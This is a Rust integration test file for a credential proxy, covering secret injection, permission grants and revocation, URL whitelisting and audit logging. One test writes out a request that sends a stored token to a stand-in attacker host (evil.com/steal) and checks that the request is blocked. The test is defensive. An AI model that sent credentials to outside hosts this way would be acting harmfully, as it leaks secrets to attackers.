//! Credential Proxy Lifecycle E2E Integration Tests
//!
//! Tests the complete credential proxy lifecycle:
//! - Create credential -> enroll agent -> grant permission -> proxy with injection
//! - URL whitelist enforcement -> permission revocation -> denied access -> audit trail

use axum::http::{Method, StatusCode};
use serde_json::{json, Value};
use uuid::Uuid;
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

use agent_cordon_core::crypto::SecretEncryptor;
use agent_cordon_core::domain::credential::{CredentialId, StoredCredential};
use agent_cordon_core::domain::workspace::{Workspace, WorkspaceId, WorkspaceStatus};
use agent_cordon_core::storage::Store;

use crate::common::*;
use agent_cordon_server::test_helpers::{TestAppBuilder, TestContext};

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

async fn setup_test_app() -> TestContext {
    TestAppBuilder::new().with_admin().build().await
}

async fn create_agent(
    store: &(dyn Store + Send + Sync),
    name: &str,
    tags: Vec<&str>,
    enabled: bool,
) -> (Workspace, String) {
    let now = chrono::Utc::now();
    let agent = Workspace {
        id: WorkspaceId(Uuid::new_v4()),
        name: name.to_string(),
        enabled,
        status: WorkspaceStatus::Active,
        pk_hash: None,
        encryption_public_key: None,
        tags: tags.into_iter().map(String::from).collect(),
        owner_id: None,
        parent_id: None,
        tool_name: None,
        created_at: now,
        updated_at: now,
    };
    store.create_workspace(&agent).await.expect("create agent");
    (agent, String::new())
}

async fn store_test_credential(
    state: &agent_cordon_server::state::AppState,
    owner: &Workspace,
    name: &str,
    service: &str,
    secret: &str,
    scopes: Vec<&str>,
    allowed_url_pattern: Option<&str>,
) -> CredentialId {
    let now = chrono::Utc::now();
    let cred_id = CredentialId(Uuid::new_v4());
    let (encrypted, nonce) = state
        .encryptor
        .encrypt(secret.as_bytes(), cred_id.0.to_string().as_bytes())
        .expect("encrypt");
    let cred = StoredCredential {
        id: cred_id.clone(),
        name: name.to_string(),
        service: service.to_string(),
        encrypted_value: encrypted,
        nonce,
        scopes: scopes.into_iter().map(String::from).collect(),
        metadata: json!({}),
        created_by: Some(owner.id.clone()),
        created_by_user: None,
        created_at: now,
        updated_at: now,
        allowed_url_pattern: allowed_url_pattern.map(String::from),
        expires_at: None,
        transform_script: None,
        transform_name: None,
        vault: "default".to_string(),
        credential_type: "generic".to_string(),
        tags: vec![],
        description: None,
        target_identity: None,
        key_version: 1,
    };
    state
        .store
        .store_credential(&cred)
        .await
        .expect("store credential");

    for perm in &["read", "write", "delete", "delegated_use"] {
        grant_cedar_permission(state, &cred_id, &owner.id, perm).await;
    }

    cred_id
}

async fn get_jwt_da(
    state: &agent_cordon_server::state::AppState,
    agent: &Workspace,
    api_key: &str,
) -> (String, String, p256::ecdsa::SigningKey) {
    let (device_id, signing_key) = create_device_and_bind_agent(state, agent).await;
    let jwt = get_jwt_via_device(state, &signing_key, &device_id, api_key).await;
    (jwt, device_id, signing_key)
}

async fn send_json_da(
    state: &agent_cordon_server::state::AppState,
    method: Method,
    uri: &str,
    device_key: &p256::ecdsa::SigningKey,
    device_id: &str,
    agent_jwt: &str,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let app = agent_cordon_server::build_router(state.clone());
    send_json_dual_auth(&app, method, uri, device_key, device_id, agent_jwt, body).await
}

// ===========================================================================
// Test: Credential Proxy Injects Secret
// ===========================================================================

#[tokio::test]
async fn test_credential_proxy_injects_secret() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.clone().expect("admin");
    let _api_key = ctx.admin_key.clone();
    let _store = ctx.store.clone();
    let _encryptor = ctx.encryptor.clone();
    let state = ctx.state.clone();
    let mock_server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/api/data"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({"result": "ok"})))
        .mount(&mock_server)
        .await;

    let secret = "ghp_super_secret_token_12345";
    let _cred_id = store_test_credential(
        &state,
        &admin,
        "github-pat",
        "github",
        secret,
        vec!["repo"],
        None,
    )
    .await;

    let jwt = ctx_admin_jwt(&ctx).await;
    let admin_dev = ctx.admin_device.as_ref().expect("admin device");
    let dev_id = &admin_dev.device_id;
    let dev_key = &admin_dev.signing_key;

    let upstream_url = format!("{}/api/data", mock_server.uri());
    let (status, body) = send_json_da(
        &state,
        Method::POST,
        "/api/v1/proxy/execute",
        dev_key,
        dev_id,
        &jwt,
        Some(json!({
            "method": "GET",
            "url": upstream_url,
            "headers": {"Authorization": "Bearer {{github-pat}}"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::OK, "proxy: {}", body);
    assert_eq!(body["data"]["status_code"], 200);
    let resp_body: Value = serde_json::from_str(body["data"]["body"].as_str().unwrap()).unwrap();
    assert_eq!(resp_body["result"], "ok");
}

// ===========================================================================
// Test: Credential Proxy No Permission Denied
// ===========================================================================

#[tokio::test]
async fn test_credential_proxy_no_permission_denied() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.clone().expect("admin");
    let store = ctx.store.clone();
    let _encryptor = ctx.encryptor.clone();
    let state = ctx.state.clone();

    // Create a non-admin agent with no permissions on the credential
    let (_viewer, viewer_key) = create_agent(&*store, "viewer-bot", vec!["viewer"], true).await;

    let _cred_id = store_test_credential(
        &state,
        &admin,
        "admin-only-secret",
        "slack",
        "xoxb-secret-value",
        vec!["chat:write"],
        None,
    )
    .await;

    let (viewer_jwt, viewer_dev_id, viewer_dev_key) =
        get_jwt_da(&state, &_viewer, &viewer_key).await;

    let (status, body) = send_json_da(
        &state,
        Method::POST,
        "/api/v1/proxy/execute",
        &viewer_dev_key,
        &viewer_dev_id,
        &viewer_jwt,
        Some(json!({
            "method": "GET",
            "url": "https://slack.com/api/test?token={{admin-only-secret}}",
        })),
    )
    .await;

    // v1.15.0: vend_credential requires explicit grants or ownership match.
    // Viewer has no grants on the admin-owned credential → proxy denied.
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "proxy without grants should be denied: {}",
        body
    );
}

// ===========================================================================
// Test: URL Whitelist Enforcement
// ===========================================================================

#[tokio::test]
async fn test_credential_proxy_url_whitelist_enforcement() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.clone().expect("admin");
    let _api_key = ctx.admin_key.clone();
    let _store = ctx.store.clone();
    let _encryptor = ctx.encryptor.clone();
    let state = ctx.state.clone();

    // Credential only allowed for github.com URLs
    let _cred_id = store_test_credential(
        &state,
        &admin,
        "github-restricted",
        "github",
        "ghp_restricted_token",
        vec!["repo"],
        Some("https://api.github.com/*"),
    )
    .await;

    let jwt = ctx_admin_jwt(&ctx).await;
    let admin_dev = ctx.admin_device.as_ref().expect("admin device");
    let dev_id = &admin_dev.device_id;
    let dev_key = &admin_dev.signing_key;

    // Try to use with a different domain
    let (status, body) = send_json_da(
        &state,
        Method::POST,
        "/api/v1/proxy/execute",
        dev_key,
        dev_id,
        &jwt,
        Some(json!({
            "method": "GET",
            "url": "https://evil.com/steal?token={{github-restricted}}",
        })),
    )
    .await;

    assert_eq!(status, StatusCode::FORBIDDEN, "url mismatch: {}", body);
}

// ===========================================================================
// Test: Permission Revocation
// ===========================================================================

#[tokio::test]
async fn test_credential_proxy_permission_revocation() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.clone().expect("admin");
    let store = ctx.store.clone();
    let _encryptor = ctx.encryptor.clone();
    let state = ctx.state.clone();
    let mock_server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/api/test"))
        .respond_with(ResponseTemplate::new(200).set_body_string("ok"))
        .mount(&mock_server)
        .await;

    // Create a second agent WITHOUT admin tag (so Cedar uses permission-based rules)
    let (agent_b, agent_b_key) = create_agent(&*store, "agent-b", vec!["reader"], true).await;

    let cred_id = store_test_credential(
        &state,
        &admin,
        "revoke-test-cred",
        "test",
        "secret-to-revoke",
        vec!["read"],
        None,
    )
    .await;

    // Grant agent_b permissions via Cedar grant policies
    for perm in &["read", "delegated_use"] {
        grant_cedar_permission(&state, &cred_id, &agent_b.id, perm).await;
    }

    // Proxy should work
    let (jwt_b, dev_b_id, dev_b_key) = get_jwt_da(&state, &agent_b, &agent_b_key).await;

    let upstream_url = format!("{}/api/test", mock_server.uri());
    let (status, body) = send_json_da(
        &state,
        Method::POST,
        "/api/v1/proxy/execute",
        &dev_b_key,
        &dev_b_id,
        &jwt_b,
        Some(json!({
            "method": "GET",
            "url": &upstream_url,
            "headers": {"Authorization": "Bearer {{revoke-test-cred}}"}
        })),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::OK,
        "proxy should work before revocation: {}",
        body
    );

    // Revoke delegated_use permission via Cedar
    revoke_cedar_permission(&state, &cred_id, &agent_b.id, "delegated_use").await;

    // v1.15.0: vend_credential requires explicit grants or ownership match.
    // After revoking delegated_use, the agent has no grant for vend → denied.
    let jwt_b2 = get_jwt_via_device(&state, &dev_b_key, &dev_b_id, &agent_b_key).await;

    let (status, body) = send_json_da(
        &state,
        Method::POST,
        "/api/v1/proxy/execute",
        &dev_b_key,
        &dev_b_id,
        &jwt_b2,
        Some(json!({
            "method": "GET",
            "url": &upstream_url,
            "headers": {"Authorization": "Bearer {{revoke-test-cred}}"}
        })),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "proxy should be denied after revoking delegated_use: {}",
        body
    );
}

// ===========================================================================
// Test: Audit Events
// ===========================================================================

#[tokio::test]
async fn test_credential_proxy_audit_events() {
    let ctx = setup_test_app().await;
    let admin = ctx.admin_agent.clone().expect("admin");
    let _api_key = ctx.admin_key.clone();
    let store = ctx.store.clone();
    let _encryptor = ctx.encryptor.clone();
    let state = ctx.state.clone();
    let mock_server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/api/audit-test"))
        .respond_with(ResponseTemplate::new(200).set_body_string("audit-ok"))
        .mount(&mock_server)
        .await;

    let _cred_id = store_test_credential(
        &state,
        &admin,
        "audit-proxy-cred",
        "test",
        "audit-secret-value",
        vec!["read"],
        None,
    )
    .await;

    let jwt = ctx_admin_jwt(&ctx).await;
    let admin_dev = ctx.admin_device.as_ref().expect("admin device");
    let dev_id = &admin_dev.device_id;
    let dev_key = &admin_dev.signing_key;

    let upstream_url = format!("{}/api/audit-test", mock_server.uri());
    let (status, _body) = send_json_da(
        &state,
        Method::POST,
        "/api/v1/proxy/execute",
        dev_key,
        dev_id,
        &jwt,
        Some(json!({
            "method": "GET",
            "url": &upstream_url,
            "headers": {"Authorization": "Bearer {{audit-proxy-cred}}"}
        })),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    // Check audit events for proxy access
    let events = store.list_audit_events(50, 0).await.unwrap();
    let proxy_events: Vec<_> = events
        .iter()
        .filter(|e| e.action == "proxy_execute" || e.resource_type == "proxy")
        .collect();
    assert!(
        !proxy_events.is_empty(),
        "should have audit event for proxy access, all events: {:?}",
        events.iter().map(|e| &e.action).collect::<Vec<_>>()
    );
}

// ===========================================================================
// Test: No Placeholders Rejected
// ===========================================================================

#[tokio::test]
async fn test_credential_proxy_no_placeholders_rejected() {
    let ctx = setup_test_app().await;
    let _api_key = ctx.admin_key.clone();
    let state = ctx.state.clone();

    let jwt = ctx_admin_jwt(&ctx).await;
    let admin_dev = ctx.admin_device.as_ref().expect("admin device");
    let dev_id = &admin_dev.device_id;
    let dev_key = &admin_dev.signing_key;

    let (status, body) = send_json_da(
        &state,
        Method::POST,
        "/api/v1/proxy/execute",
        dev_key,
        dev_id,
        &jwt,
        Some(json!({
            "method": "GET",
            "url": "https://example.com/api/data",
            "headers": {"Content-Type": "application/json"}
        })),
    )
    .await;

    assert_eq!(status, StatusCode::BAD_REQUEST, "no placeholders: {}", body);
    assert!(
        body["error"]["message"]
            .as_str()
            .unwrap()
            .contains("no credential placeholders"),
        "error should mention missing placeholders"
    );
}
